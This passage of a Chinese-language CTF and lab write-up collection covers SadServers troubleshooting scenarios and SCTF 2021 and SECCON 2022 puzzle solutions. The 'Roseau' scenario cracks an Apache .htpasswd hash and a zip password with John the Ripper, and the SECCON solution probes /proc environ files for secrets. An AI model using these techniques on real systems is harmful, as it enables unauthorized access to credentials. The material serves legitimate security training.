<pre><code>admin@ip-10-0-0-138:/$ sudo iptables -t nat -F       \nadmin@ip-10-0-0-138:/$ etcdctl get foo\nbar\nadmin@ip-10-0-0-138:/$ curl https://localhost:2379/v2/keys/foo\n{\"action\":\"get\",\"node\":{\"key\":\"/foo\",\"value\":\"bar\",\"modifiedIndex\":4,\"createdIndex\":4}}\n</code></pre></p>"},{"location":"writeups/sadservers/#pokhara","title":"\"Pokhara\"","text":"<p>Scenario: \"Pokhara\": SSH and other sshenanigans</p> <p>Level: Hard</p> <p>Description: A user <code>client</code> was added to the server, as well as their SSH public key. The objective is to be able to SSH locally (there's only one server) as this user client using their ssh keys. This is, if as root you change to this user <code>sudo su; su client</code>, you should be able to login with ssh: <code>ssh localhost</code>.</p> <p>OS: Debian 11</p> <p>\u9996\u5148\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u53d1\u73b0\u8fde\u5207\u6362\u5230 client \u7528\u6237\u90fd\u4e0d\u53ef\u4ee5\uff1a <pre><code>admin@ip-172-31-33-16:/$ sudo su\nroot@ip-172-31-33-16:/# su client\nYour account has expired; please contact your system administrator.\n</code></pre></p> <p>\u7528\u6237\u8fc7\u671f\u4e86\uff0c\u90a3\u5c31\u5ef6\u4e00\u4e0b\uff1a <pre><code>admin@ip-172-31-33-16:/$ sudo chage -l client\nLast password change                                    : Feb 05, 2023\nPassword expires                                        : never\nPassword inactive                                       : never\nAccount expires                                         : Jan 01, 1970\nMinimum number of days between password change          : 0\nMaximum number of days between password change          : 99999\nNumber of days of warning before password expires       : 7\nadmin@ip-172-31-33-16:/$ sudo usermod -e 2024-01-01 client\nadmin@ip-172-31-33-16:/$ sudo chage -l client\nLast password change                                    : Feb 05, 2023\nPassword expires                                        : never\nPassword inactive                                       : never\nAccount expires                                         : Jan 01, 2024\nMinimum number of days between password change          : 0\nMaximum number of days between password change          : 99999\nNumber of days of warning before password expires       : 7\n</code></pre></p> <p>\u518d\u6b21\u767b\u9646\uff0c\u51fa\u73b0\u62a5\u9519\uff1a <pre><code>root@ip-172-31-33-16:/# su client\nsu: failed to execute /usr/sbin/nologin: Resource temporarily unavailable\n</code></pre> \u5b83\u8bd5\u56fe\u6267\u884c <code>/usr/sbin/nologin</code>\uff0c\u4f46\u662f\u6b63\u5e38\u6765\u8bb2\u5e94\u8be5\u662f\u4e00\u4e2a shell\uff0c\u6240\u4ee5\u6539\u4e00\u4e0b\u5148\uff0c\u4f46\u4ecd\u7136\u4f1a\u51fa\u73b0\u62a5\u9519\uff1a <pre><code>root@ip-172-31-33-16:/# lslogins client\n...                 \nShell:                              /usr/sbin/nologin                   \n...\nroot@ip-172-31-33-16:/# usermod --shell /bin/bash client\nroot@ip-172-31-33-16:/# lslogins client\n...\nShell:                              /bin/bash                           \n...\nroot@ip-172-31-33-16:/# su client\nsu: failed to execute /bin/bash: Resource temporarily unavailable\n</code></pre></p> <p>\u641c\u7d22\u4e86\u89e3\u5230\u53ef\u80fd\u662f\u767b\u9646\u6570\u91cf\u88ab\u9650\u5236\u4e86\uff0c\u5728 <code>/etc/security/limits.conf</code> \u4e2d\u53d1\u73b0\uff1a <pre><code>client          hard    nproc           0\n</code></pre> \u6ce8\u91ca\u6389\u8fd9\u4e00\u884c\uff0c\u53ef\u4ee5\u767b\u9646 client \u7528\u6237\u4e86\uff0c\u4f46\u662f ssh \u8fd8\u6709\u95ee\u9898\uff1a <pre><code>root@ip-172-31-33-16:/# su client\nclient@ip-172-31-33-16:/$ ssh localhost\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nIT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!\nSomeone could be eavesdropping on you right now (man-in-the-middle attack)!\nIt is also possible that a host key has just been changed.\nThe fingerprint for the ECDSA key sent by the remote host is\nSHA256:nfWAp8P5xQ+rJbfolHi8/jTpKNa+DlN1MXv1Wwus+4M.\nPlease contact your system administrator.\nAdd correct host key in /home/client/.ssh/known_hosts to get rid of this message.\nOffending ECDSA key in /home/client/.ssh/known_hosts:1\n  remove with:\n  ssh-keygen -f \"/home/client/.ssh/known_hosts\" -R \"localhost\"\nECDSA host key for localhost has changed and you have requested strict checking.\nHost key verification failed.\n</code></pre> \u6839\u636e\u6307\u5bfc\uff0c\u5728 client \u7528\u6237\u4e0b\u6267\u884c ssh-keygen\uff1a <pre><code>client@ip-172-31-33-16:/$ ssh-keygen -f \"/home/client/.ssh/known_hosts\" -R \"localhost\"\n# Host localhost found: line 1\n/home/client/.ssh/known_hosts updated.\nOriginal contents retained as /home/client/.ssh/known_hosts.old\nclient@ip-172-31-33-16:/$ ssh localhost\nThe authenticity of host 'localhost (127.0.0.1)' can't be established.\nECDSA key fingerprint is SHA256:nfWAp8P5xQ+rJbfolHi8/jTpKNa+DlN1MXv1Wwus+4M.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added 'localhost' (ECDSA) to the list of known hosts.\nclient@localhost: Permission denied (publickey).\n</code></pre></p> <p>\u53c8 Permission denied\uff0c\u6240\u4ee5\u53bb\u67e5\u4e00\u4e0b ssh \u7684\u914d\u7f6e\u6587\u4ef6\uff1a <pre><code>root@ip-172-31-33-16:/# cat /etc/ssh/sshd_config.d/sad.conf\nDenyUsers client\n</code></pre> \u5220\u6389\u8fd9\u4e00\u884c\uff0c<code>systemctl restart ssh</code> \u91cd\u542f\u670d\u52a1\uff0c\u518d\u6b21\u5c1d\u8bd5\uff0c\u5f97\u5230\uff1a <pre><code>client@ip-172-31-33-16:/$ ssh localhost\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nPermissions 0644 for '/home/client/.ssh/id_rsa' are too open.\nIt is required that your private key files are NOT accessible by others.\nThis private key will be ignored.\nLoad key \"/home/client/.ssh/id_rsa\": bad permissions\nclient@localhost: Permission denied (publickey).\nclient@ip-172-31-33-16:/$ ls -l /home/client/.ssh/id_rsa\n-rw-r--r-- 1 client client 2610 Feb  5 22:33 /home/client/.ssh/id_rsa\n</code></pre> \u5b83\u544a\u8bc9\u6211\u4eec id_rsa \u7684\u6743\u9650\u592a\u5927\u4e86\uff0c\u56e0\u6b64\u7ed9 group \u548c others \u7684 r \u6743\u9650\u90fd\u53bb\u6389\uff1a <pre><code>client@ip-172-31-33-16:/$ chmod g-r /home/client/.ssh/id_rsa\nclient@ip-172-31-33-16:/$ chmod o-r /home/client/.ssh/id_rsa\n</code></pre> \u5373\u53ef\u6b63\u5e38 ssh \u767b\u9646\uff1a <pre><code>client@ip-172-31-33-16:/$ ssh localhost\nLinux ip-172-31-33-16 5.10.0-14-cloud-amd64 #1 SMP Debian 5.10.113-1 (2022-04-29) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sun Feb  5 23:00:41 2023 from 127.0.0.1\n</code></pre></p>"},{"location":"writeups/sadservers/#roseau","title":"\"Roseau\"","text":"<p>Scenario: \"Roseau\": Hack a Web Server</p> <p>Level: Hard</p> <p>Description: There is a secret stored in a file that the local Apache web server can provide. Find this secret and have it as a /home/admin/secret.txt file.</p> <p>Note that in this server the admin user is not a sudoer.</p> <p>Also note that the password crackers Hashcat and Hydra are installed from packages and John the Ripper binaries have been built from source in /home/admin/john/run.</p> <p>OS: Debian 11</p> <p>Sadservers \u4e0a\u7b2c\u4e00\u9053 Hack \u7c7b\u9898\u76ee\u7684\u9898\uff0c\u4e0d\u8fc7\u770b\u8d77\u6765\u76ee\u7684\u4e5f\u5f88\u660e\u786e\uff0c\u533a\u522b\u57fa\u672c\u5c31\u662f\u6ca1\u6709 root \u6743\u9650\uff0c\u9700\u8981\u7ed5\u8fc7\u3001\u7834\u89e3\u7b49\u3002</p> <p>\u65e2\u7136\u6709\u4e00\u4e2a Apache \u670d\u52a1\uff0c\u90a3\u5c31\u5148 curl \u4e00\u4e0b localhost\uff1a <pre><code>admin@ip-172-31-34-168:~$ curl localhost\n&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;\n&lt;html&gt;&lt;head&gt;\n&lt;title&gt;401 Unauthorized&lt;/title&gt;\n&lt;/head&gt;&lt;body&gt;\n&lt;h1&gt;Unauthorized&lt;/h1&gt;\n&lt;p&gt;This server could not verify that you\nare authorized to access the document\nrequested.  Either you supplied the wrong\ncredentials (e.g., bad password), or your\nbrowser doesn't understand how to supply\nthe credentials required.&lt;/p&gt;\n&lt;hr&gt;\n&lt;address&gt;Apache/2.4.54 (Debian) Server at localhost Port 80&lt;/address&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre> \u9700\u8981\u8ba4\u8bc1\uff0c\u800c Apache \u7684\u914d\u7f6e\u6587\u4ef6\u662f\u53ef\u4ee5\u76f4\u63a5\u770b\u5230\u7684\uff1a <pre><code>admin@ip-172-31-34-168:/$ cat /etc/apache2/sites-enabled/000-default.conf\n&lt;VirtualHost *:80&gt;\n        ServerAdmin webmaster@localhost\n        DocumentRoot /var/www/html\n        ErrorLog ${APACHE_LOG_DIR}/error.log\n        CustomLog ${APACHE_LOG_DIR}/access.log combined\n\n\n        &lt;Directory \"/var/www/html\"&gt;\n                AuthType Basic\n                AuthName \"Protected Content\"\n                AuthUserFile /etc/apache2/.htpasswd\n                Require valid-user\n        &lt;/Directory&gt;\n&lt;/VirtualHost&gt;\n</code></pre> \u6240\u4ee5\u6574\u4e2a\u76ee\u5f55\u90fd\u88ab\u4fdd\u62a4\u4e86\uff0c\u4f7f\u7528 <code>/etc/apache2/.htpasswd</code> \u4e2d\u7684\u8d26\u53f7\u5bc6\u7801\u624d\u80fd\u8bbf\u95ee\u3002\u800c\u8fd9\u4e2a\u6587\u4ef6\u6211\u4eec\u4e5f\u662f\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u7684\uff1a <pre><code>admin@ip-172-31-34-168:/$ cat /etc/apache2/.htpasswd\ncarlos:$apr1$b1kyfnHB$yRHwzbuKSMyW62QTnGYCb0\n</code></pre> \u9898\u76ee\u91cc\u8bf4\u4e86\u63d0\u4f9b\u4e86 John the Ripper\uff0c\u641c\u4e00\u4e0b\u53ef\u4ee5\u77e5\u9053\u8fd9\u662f\u4e2a\u7834\u89e3\u5bc6\u7801\u7684\u5de5\u5177\uff0c\u76f4\u63a5\u628a .htpasswd \u6587\u4ef6\u4e22\u8fdb\u53bb\uff1a <pre><code>admin@ip-172-31-34-168:/$ cd ~/john/run/\nadmin@ip-172-31-34-168:~/john/run$ ./john /etc/apache2/.htpasswd\nWarning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\"\nUse the \"--format=md5crypt-long\" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])\nWill run 2 OpenMP threads\nProceeding with single, rules:Single\nPress 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status\nWarning: Only 34 candidates buffered for the current salt, minimum 48 needed for performance.\nAlmost done: Processing the remaining buffered candidate passwords, if any.\n0g 0:00:00:00 DONE 1/3 (2023-02-20 03:59) 0g/s 9527p/s 9527c/s 9527C/s Carlos1921..Carlos1900\nProceeding with wordlist:./password.lst\nEnabling duplicate candidate password suppressor\nchalet           (carlos)     \n1g 0:00:00:01 DONE 2/3 (2023-02-20 03:59) 0.6097g/s 40560p/s 40560c/s 40560C/s 050381..song\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre> \u5f97\u5230\u7528\u6237 carlos \u7684\u5bc6\u7801 chalet\uff0c\u7136\u540e\u901a\u8fc7 -u \u9009\u9879\u6765 curl\uff1a <pre><code>admin@ip-172-31-34-168:~/john/run$ curl -u carlos:chalet localhost\n&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"&gt;\n&lt;html&gt;\n &lt;head&gt;\n  &lt;title&gt;Index of /&lt;/title&gt;\n &lt;/head&gt;\n &lt;body&gt;\n&lt;h1&gt;Index of /&lt;/h1&gt;\n ...\n&lt;/body&gt;&lt;/html&gt;\n</code></pre> \u53ef\u4ee5\u6210\u529f\u8ba4\u8bc1\uff0c\u7136\u540e\u5217\u4e00\u4e0b <code>/var/www/html</code> \u7684\u5185\u5bb9\uff0c\u53d1\u73b0\u6709\u4e00\u4e2a webfile\uff0ccurl \u4e0b\u6765\uff1a <pre><code>admin@ip-172-31-34-168:~/john/run$ ls /var/www/html/\nwebfile\nadmin@ip-172-31-34-168:~/john/run$ curl -u carlos:chalet localhost/webfile\nWarning: Binary output can mess up your terminal. Use \"--output -\" to tell \nWarning: curl to output it to your terminal anyway, or consider \"--output \nWarning: &lt;FILE&gt;\" to save to a file.\nadmin@ip-172-31-34-168:~/john/run$ curl -u carlos:chalet localhost/webfile --output ~/secret\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   215  100   215    0     0   104k      0 --:--:-- --:--:-- --:--:--  104k\n</code></pre> file \u4e00\u4e0b\u53d1\u73b0 secret \u662f\u4e2a zip\uff0c\u4f46 unzip \u9700\u8981\u5bc6\u7801\uff1a <pre><code>admin@ip-172-31-34-168:~$ file secret\nsecret: Zip archive data, at least v1.0 to extract\nadmin@ip-172-31-34-168:~$ unzip secret\nArchive:  secret\n[secret] secret.txt password:\n</code></pre> \u540c\u6837\u53ef\u4ee5\u4f7f\u7528 John the Ripper \u6765\u7834\u89e3\uff1a <pre><code>admin@ip-172-31-34-168:~$ john/run/zip2john secret &gt; secret.passwd\nver 1.0 efh 5455 efh 7875 secret/secret.txt PKZIP Encr: 2b chk, TS_chk, cmplen=29, decmplen=17, crc=AAC6E9AF ts=14E0 cs=14e0 type=0\nadmin@ip-172-31-34-168:~$ john/run/john secret.passwd \nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 2 OpenMP threads\nProceeding with single, rules:Single\nPress 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status\nAlmost done: Processing the remaining buffered candidate passwords, if any.\n0g 0:00:00:00 DONE 1/3 (2023-02-20 04:03) 0g/s 470700p/s 470700c/s 470700C/s Txtsecret/secret.txt1900..Tsecret1900\nProceeding with wordlist:john/run/password.lst\nEnabling duplicate candidate password suppressor\nandes            (secret/secret.txt)     \n1g 0:00:00:00 DONE 2/3 (2023-02-20 04:03) 2.777g/s 1529Kp/s 1529Kc/s 1529KC/s poussinet..nisa1234\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \nadmin@ip-172-31-34-168:~$ unzip secret\nArchive:  secret\n[secret] secret.txt password: andes\n extracting: secret.txt              \nadmin@ip-172-31-34-168:~$ ls\nagent  john  secret  secret.passwd  secret.txt\nadmin@ip-172-31-34-168:~$ cat secret.txt\nRoseau, Dominica\nadmin@ip-172-31-34-168:~$ sha1sum /home/admin/secret.txt |awk '{print $1}'\ncc2c322fbcac56923048d083b465901aac0fe8f8\n</code></pre></p>"},{"location":"writeups/sctf2021/","title":"SCTF 2021 Writeup","text":"<p> \u7ea6 347 \u4e2a\u5b57  112 \u884c\u4ee3\u7801  10 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Abstract</p> <p>\u8fd9\u573a\u6bd4\u8d5b\u7684 misc \u8303\u56f4\u6bd4\u8f83\u5e7f\uff0c\u6709\u533a\u5757\u94fe\u6709\u7269\u8054\u7f51\u8fd8\u6709\u9006\u5411\uff0c\u8fd9\u91cc\u5c31\u653e\u4e00\u4e0b\u4e09\u9053\u201c\u5e38\u89c4\u201d\u7684 misc \u7684 writeup \u4e86</p>"},{"location":"writeups/sctf2021/#this_is_a_tree","title":"This_is_A_tree","text":"<p>\u904d\u5386\u6587\u4ef6\u5939\u6811\uff0c\u5f97\u5230\u4e00\u4e32 base64\uff0c\u7136\u540e\u662f\u516d\u5341\u56db\u5366\u8f6c base64 \u7136\u540e\u89e3\u7801</p> <pre><code>from base64 import *\nimport os\nimport string\n\ndef read(path):\n    return open(path, \"r\").read()\n\nres = []\nl = \"letf/\"\nr = \"Right/\"\n\ndef readdir(path):\n    if os.path.isfile(path + \"data\"):\n        res.append(path + \"data\")\n    if os.path.isdir(path + l):\n        readdir(path + l)\n    if os.path.isdir(path + r):\n        readdir(path + r)\n\ndef get_tree():\n    readdir(\"./src/\")\n    s = \"\"\n    for i in res:\n        s += read(i)\n    print(b64decode(s).decode())\n\n# Chinese traditional culture is broad and profound! \n# So I Want Give You My Flag But You Need Decode It.Enjoy The Flag!!:\n# \u5e08  \u5151 \u590d \u635f  \u5dfd \u9707 \u664b \u59e4 \u5927\u8fc7 \u8bbc \u566c\u55d1 \u9707 \u6052 \u8282 \u8c6b \n\nb64table = string.ascii_uppercase + string.ascii_lowercase + string.digits + '+/'\ntable = {\n    '\u5764': '000000', '\u5265': '000001', '\u6bd4': '000010', '\u89c2': '000011', \n    '\u8c6b': '000100', '\u664b': '000101', '\u8403': '000110', '\u5426': '000111', \n    '\u8c26': '001000', '\u826e': '001001', '\u8e47': '001010', '\u6e10': '001011', \n    '\u5c0f\u8fc7': '001100', '\u65c5': '001101', '\u54b8': '001110', '\u9041': '001111', \n    '\u5e08': '010000', '\u8499': '010001', '\u574e': '010010', '\u6da3': '010011', \n    '\u89e3': '010100', '\u672a\u6d4e': '010101', '\u56f0': '010110', '\u8bbc': '010111', \n    '\u5347': '011000', '\u86ca': '011001', '\u4e95': '011010', '\u5dfd': '011011', \n    '\u6052': '011100', '\u9f0e': '011101', '\u5927\u8fc7': '011110', '\u59e4': '011111', \n    '\u590d': '100000', '\u9890': '100001', '\u5c6f': '100010', '\u76ca': '100011', \n    '\u9707': '100100', '\u566c\u55d1': '100101', '\u968f': '100110', '\u65e0\u5984': '100111', \n    '\u660e\u5937': '101000', '\u8d32': '101001', '\u65e2\u6d4e': '101010', '\u5bb6\u4eba': '101011', \n    '\u4e30': '101100', '\u79bb': '101101', '\u9769': '101110', '\u540c\u4eba': '101111', \n    '\u4e34': '110000', '\u635f': '110001', '\u8282': '110010', '\u4e2d\u5b5a': '110011', \n    '\u5f52\u59b9': '110100', '\u777d': '110101', '\u5151': '110110', '\u5c65': '110111', \n    '\u6cf0': '111000', '\u5927\u755c': '111001', '\u9700': '111010', '\u5c0f\u755c': '111011', \n    '\u5927\u58ee': '111100', '\u5927\u6709': '111101', '\u592c': '111110', '\u4e7e': '111111'\n}\nindex = '\u5e08 \u5151 \u590d \u635f \u5dfd \u9707 \u664b \u59e4 \u5927\u8fc7 \u8bbc \u566c\u55d1 \u9707 \u6052 \u8282 \u8c6b'.split(' ')\ns = ''.join([b64table[int(table[i], base=2)] for i in index])\n\nprint(b64decode(s + '='))\n# b'Ch1nA_yyds!'\n</code></pre>"},{"location":"writeups/sctf2021/#fumo_xor_cli","title":"fumo_xor_cli","text":"<p>\u53d1\u73b0\u6709\u4e24\u5e27\u753b\u9762\u662f\u6df7\u4e71\u7684\u989c\u8272\uff0c\u5176\u4e2d\u4e00\u5e27\u662f a\uff0c\u4e00\u5e27\u662f 9</p> <p>\u5c06\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6587\u4ef6</p> <p>\u628a\u91cc\u9762\u6240\u6709\u7684 9 \u90fd\u5220\u6389\uff0c\u7136\u540e cat\uff1a</p> <p></p> <p>\u5f97\u5230\uff1ahttps://mp.weixin.qq.com/s/E_iDJBkVEC4jZanzvqnWCA </p> <p>\u627e\u5230\u56fe\u7247\uff1ahttps://imgtu.com/i/TpMSkq </p> <p></p> <p>\u56fe\u7247\u91cc\u50cf\u7d20\u70b9\u6bcf 9*9 \u4e00\u4e2a\uff0c\u4e00\u5171\u6709 100*133 \u4e2a\u70b9\uff0c\u63d0\u53d6\u51fa\u6765\uff1a</p> <pre><code>from PIL import Image \n\nimg = Image.open(\"TpMSkq.png\")\nres = Image.new(\"RGBA\", (101, 134))\nwidth, height = img.size \nprint(width, height)\n\nprint(img.getpixel((800, 1000)))\n\nfor i in range(width):\n    for j in range(height):\n        if i % 9 == 1 and j % 9 == 1:\n            pix = img.getpixel((i, j))\n            res.putpixel((i // 9, j // 9), pix)\n\nres.save(\"in_pix.png\")\n</code></pre> <p></p> <p>CLI \u91cc\u6df7\u4e71\u7684\u8fd8\u6709\u4e00\u58069\uff08\u5728\u94fe\u63a5\u540e\u9762\uff09\uff0c\u628a\u5b83\u548c\u94fe\u63a5\u5171\u540c\u7684\u4e00\u5e27\u4e5f\u7559\u4e0b\u653e\u5230 fumo_9.txt \u4e2d\uff0c\u63d0\u53d6\u51fa\u989c\u8272\u5bfc\u51fa\u56fe\u7247\uff1a</p> <pre><code>from PIL import Image \nimport re\n\nimg = Image.new(\"RGBA\", (101, 134))\npattern = re.compile(r'\\[38;2;(\\d+?);(\\d+?);(\\d+?)m.')\n\nwith open(\"fumo_a.txt\", \"r\") as f:\n    for i in range(50):\n        line = f.readline().strip()\n        res = pattern.findall(line)\n        for j in range(133):\n            img.putpixel((i+50, j), tuple(int(res[j][k]) for k in range(3)))\n\nwith open(\"fumo_9.txt\", \"r\") as f:\n    for i in range(50):\n        line = f.readline().strip()\n        res = pattern.findall(line)\n        for j in range(133):\n            img.putpixel((i, j), tuple(int(res[j][k]) for k in range(3)))\n\nimg.save(\"cli.png\")\n</code></pre> <p>\u7136\u540e fumo \u4e2d\u63d0\u51fa\u7684\u56fe\u548c cli \u63d0\u51fa\u7684\u56fe xor \u5f97\u5230\uff1a</p> <p></p> <p>\u6ca1\u6709\u6570\u5b57\uff0c\u6240\u4ee5 flag \u662f\uff1a<code>SCTF{Good_FuMo_CTF_OvO}</code></p>"},{"location":"writeups/sctf2021/#in_the_vaporwaves","title":"in_the_vaporwaves","text":"<p>\u542c\u8d77\u6765\u4e2d\u95f4\u6709\u4e00\u6bb5\u611f\u89c9\u4e0d\u592a\u548c\u8c10\uff0c\u628a\u5de6\u53f3\u58f0\u9053\u7684\u9891\u8c31\u56fe xor \u4e86\u4e00\u4e0b\uff1a</p> <p></p> <p>\u53d1\u73b0\u53ef\u80fd\u4e2d\u95f4\u6709\u641e\u4e8b\u60c5\uff0c\u53c8\u7ec6\u770b\u5bf9\u6bd4\u4e86\u4e00\u4e0b\u5de6\u53f3\u58f0\u9053\u7684\u6ce2\u5f62\u56fe\uff0c\u53d1\u73b0\u4e2d\u95f4\u5dee\u8ddd\u8f83\u5927</p> <p>wave \u63d0\u53d6\u6570\u636e\uff0c\u5de6\u53f3\u58f0\u9053\u76f8\u52a0\uff1a</p> <pre><code>import wave\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nwav = wave.open(\"c.wav\", \"r\")\nnframes = wav.getnframes()\nframerate = wav.getframerate()\ndata = wav.readframes(nframes)\nwav.close()\nwave_data = np.fromstring(data, dtype=np.short)\nwave_data.shape = -1, 2\nwave_data = wave_data.T\ntime = np.arange(0, nframes) * (1.0 / framerate)\n\nres = wave_data[0] + wave_data[1]\n\nplt.figure()\n# plt.plot(time, res)\nplt.plot(time[87*framerate:128*framerate], res[87*framerate:128*framerate])\nplt.show()\n</code></pre> <p></p> <p></p> <p>\u4ece\u5f00\u5934\u4e09\u4e2a\u77ed\u7ad6\u7ebf\u53ef\u4ee5\u63a8\u6d4b\u662f\u6469\u5c14\u65af\u7535\u7801\u8f6c\u6362\u7684 SCTF \u5f00\u5934\uff0c\u957f\u77ed\u6284\u4e0b\u6765\u7136\u540e\u6469\u5c14\u65af\u89e3\u7801\uff0c\u5f97\u5230 flag</p> <pre><code>... -.-. - ..-. -.. . ... .---- .-. ...-- ..--.- -.. .-. .. ...- . ... ..--.- .. -. - ----- ..--.- ...- .- .--. --- .-. .-- .--.-. ...- . ...\n</code></pre> <p>SCTFDES1R3_DRIVES_INT0_VAPORW@VES</p> <p>flag: <code>SCTF{DES1R3_DRIVES_INT0_VAPORW@VES}</code></p>"},{"location":"writeups/seccon2022/","title":"SECCON CTF 2022 Quals Writeup","text":"<p> \u7ea6 1720 \u4e2a\u5b57  111 \u884c\u4ee3\u7801  3 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>Abstract</p> <p>\u9694\u4e86\u51e0\u5e74\u540e\u7b2c\u4e00\u6b21\u6709\u65e5\u672c\u7ebf\u4e0b\u51b3\u8d5b\u7684 SECCON\uff0c\u961f\u91cc\u51b3\u5b9a\u597d\u597d\u6253\u4e00\u4e0b\uff0c\u9884\u9009\u8d5b 24 \u5c0f\u65f6\uff0c\u6700\u540e\u52c9\u5f3a\u538b\u7ebf\u8fdb\u4e86\u51b3\u8d5b\u3002</p> <p>misc \u9898\u6bd4\u8f83\u5750\u7262\uff0c\u5927\u6982\u5c31\u662f\u6e90\u7801\u5f88\u7b80\u5355\uff0c\u4f46\u662f\u5c31\u662f\u5f88\u96be\u60f3\u51fa\u6765\u505a\u6cd5\u3002\u800c\u4e14\u6709\u90a3\u4e48\u4e00\u4e1d hackergame \u7684\u5473\u9053\u3002</p> <p>\u5728\u961f\u53cb\u5e2e\u52a9\u4e0b\u8fd8\u662f\u5dee\u4e86\u4e00\u9053 AK\uff0c\u4e0d\u8fc7\u90a3\u4e00\u9053\u540e\u6765\u5728 discord \u770b\u5230\u4e86\u522b\u4eba\u5206\u4eab\u7684 payload\uff0c\u5176\u5b9e\u89e3\u6cd5\u4e5f\u4e0d\u96be\u7684\uff0c\u53ef\u60dc\u4e86\u2026\u2026</p> <p>noiseccon \u90a3\u9898\u6211\u57fa\u672c\u6ca1\u53c2\u4e0e\uff0c\u6ca1\u7ec6\u770b\uff0c\u5c31\u4e0d\u5199\u4e86\u3002</p>"},{"location":"writeups/seccon2022/#find-flag","title":"find flag","text":"\u9898\u76ee\u6e90\u7801 <pre><code>#!/usr/bin/env python3.9\nimport os\n\nFLAG = os.getenv(\"FLAG\", \"FAKECON{*** REDUCTED ***}\").encode()\n\ndef check():\n    try:\n        filename = input(\"filename: \")\n        if open(filename, \"rb\").read(len(FLAG)) == FLAG:\n            return True\n    except FileNotFoundError:\n        print(\"[-] missing\")\n    except IsADirectoryError:\n        print(\"[-] seems wrong\")\n    except PermissionError:\n        print(\"[-] not mine\")\n    except OSError:\n        print(\"[-] hurting my eyes\")\n    except KeyboardInterrupt:\n        print(\"[-] gone\")\n    return False\n\nif __name__ == '__main__':\n    try:\n        check = check()\n    except:\n        print(\"[-] something went wrong\")\n        exit(1)\n    finally:\n        if check:\n            print(\"[+] congrats!\")\n            print(FLAG.decode())\n</code></pre> <p>\u6e90\u7801\u4e0d\u957f\uff0c\u5c31\u662f\u8f93\u5165\u4e00\u4e2a\u6587\u4ef6\u540d\uff0c\u7136\u540e\u5b83\u4f1a\u8bfb\u53d6\uff0c\u5982\u679c\u5f00\u5934\u5c31\u662f flag\uff0c\u90a3\u4e48\u5c31\u8f93\u51fa flag\u3002</p> <p>\u521a\u5f00\u59cb\u7684\u65f6\u5019\u6211\u4eec\u5c31\u4ee5\u4e3a\u662f\u8981\u627e\u8fd9\u6837\u7684\u4e00\u4e2a\u6587\u4ef6\u3002\u6d4b\u8bd5\u4e86\u597d\u591a\uff0c\u53cd\u6b63\u662f /proc/1/environ \u548c /proc/self/environ \u91cc\u662f\u6709 flag \u7684\uff0c\u4f46\u662f\u5b83\u4e0d\u5728\u5f00\u5934\u3002\u6240\u4ee5\u60f3\u8981\u627e\u529e\u6cd5\u8ba9 open \u8bfb\u53d6\u7684\u65f6\u5019\u81ea\u5e26\u504f\u79fb\u3002\u7ffb\u4e86\u6e90\u7801\u4e5f\u641e\u4e0d\u61c2\u3002</p> <p>\u7136\u540e\u662f\u5728\u4e00\u6b21\u672c\u5730\u6d4b\u8bd5\u7684\u65f6\u5019\uff0c\u6dfb\u52a0\u7684\u989d\u5916\u547d\u4ee4\u5076\u7136\u89e6\u53d1\u4e86\u7f16\u7801\u9519\u8bef\uff0c\u4f46\u662f\u5374\u5f39\u51fa\u4e86 flag\uff0c\u540c\u65f6\u9644\u5e26\u7684\u8fd8\u6709 \"[-] something went wrong\"\u3002</p> <p>\u8fd9\u624d\u60f3\u8d77\u6765 python \u7684 try-except-finally \u8bed\u53e5\u662f\u65e0\u8bba\u5982\u4f55\u90fd\u4f1a\u6267\u884c finally\uff0c\u800c\u4e14\u5982\u679c check \u51fd\u6570\u4e2d\u95f4\u4ea7\u751f\u4e86\u5176\u5b83\u6ca1\u6709\u88ab\u6355\u83b7\u7684\u5f02\u5e38\u7684\u8bdd\u5c31\u4f1a\u9000\u51fa\uff0c\u7136\u540e\u8fd9\u4e2a\u5f02\u5e38\u88ab main \u91cc\u7684 except \u6355\u83b7\u3002\u867d\u7136 exit(1) \u4e86\uff0c\u4f46\u662f\u5e76\u4e0d\u4f1a\u9000\u51fa\u7a0b\u5e8f\uff0c\u800c\u662f\u4f1a\u8fdb\u5165\u5230 finally \u5757\u4e2d\u3002\u800c\u4e14\u6b64\u65f6\u7531\u4e8e check \u51fd\u6570\u88ab\u4e2d\u65ad\u4e86\uff0c\u6240\u4ee5 check 